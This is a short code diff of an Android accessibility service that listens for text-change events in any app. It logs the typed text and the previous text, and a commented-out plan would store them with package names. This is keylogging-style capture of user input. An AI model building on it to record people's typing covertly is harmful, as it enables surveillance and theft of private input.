@@ -16,15 +16,16 @@ class MyAccessibilityService : AccessibilityService() {
         if (event == null) return
         //
         if (event.eventType == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
-            Log.d("Keyboard", "Keyboard event: " + event.toString())
-            TODO("Create a content provider to store information")
-            /** val keyboard = ContentValues()
-            keyboard.put("package_name", event.packageName)
-            keyboard.put("event_time", event.eventTime)
-            keyboard.put("new_text", event.text)
-            keyboard.put("before_text", event.beforeText)**/
-            Log.d("Keyboard", "New text: " + event.text)
-            Log.d("Keyboard", "Before text: " + event.beforeText)
+            Log.d("AccesKeyboard", "Keyboard event: " + event.toString())
+            /** Create a content provider to store information
+             * * val keyboard = ContentValues()
+             * keyboard.put("package_name", event.packageName)
+             * keyboard.put("event_time", event.eventTime)
+             * keyboard.put("new_text", event.text)
+             * keyboard.put("before_text", event.beforeText)
+             * **/
+            Log.d("AccesKeyboard", "New text: " + event.text)
+            Log.d("AccesKeyboard", "Before text: " + event.beforeText)
         }
     }
 
